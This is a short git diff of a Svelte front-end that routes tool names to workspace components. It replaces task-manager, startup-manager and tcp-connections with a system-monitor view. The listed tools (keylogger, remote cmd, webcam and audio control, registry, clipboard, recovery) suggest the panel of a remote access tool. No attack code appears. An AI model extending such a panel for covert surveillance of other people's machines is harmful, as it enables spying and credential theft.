@@ -17,11 +17,9 @@
 	import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
 	import CmdWorkspace from '$lib/components/workspace/tools/cmd-workspace.svelte';
 	import FileManagerWorkspace from '$lib/components/workspace/tools/file-manager-workspace.svelte';
-	import TaskManagerWorkspace from '$lib/components/workspace/tools/task-manager-workspace.svelte';
+	import SystemMonitorWorkspace from '$lib/components/workspace/tools/system-monitor-workspace.svelte';
 	import RegistryManagerWorkspace from '$lib/components/workspace/tools/registry-manager-workspace.svelte';
-	import StartupManagerWorkspace from '$lib/components/workspace/tools/startup-manager-workspace.svelte';
 	import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
-	import TcpConnectionsWorkspace from '$lib/components/workspace/tools/tcp-connections-workspace.svelte';
 	import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
 	import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
 	import OpenUrlWorkspace from '$lib/components/workspace/tools/open-url-workspace.svelte';
@@ -41,11 +39,9 @@
 		'webcam-control': WebcamControlWorkspace,
 		'audio-control': AudioControlWorkspace,
 		'file-manager': FileManagerWorkspace,
-		'task-manager': TaskManagerWorkspace,
+		'system-monitor': SystemMonitorWorkspace,
 		'registry-manager': RegistryManagerWorkspace,
-		'startup-manager': StartupManagerWorkspace,
 		'clipboard-manager': ClipboardManagerWorkspace,
-		'tcp-connections': TcpConnectionsWorkspace,
 		recovery: RecoveryWorkspace,
 		options: OptionsWorkspace,
 		'open-url': OpenUrlWorkspace,
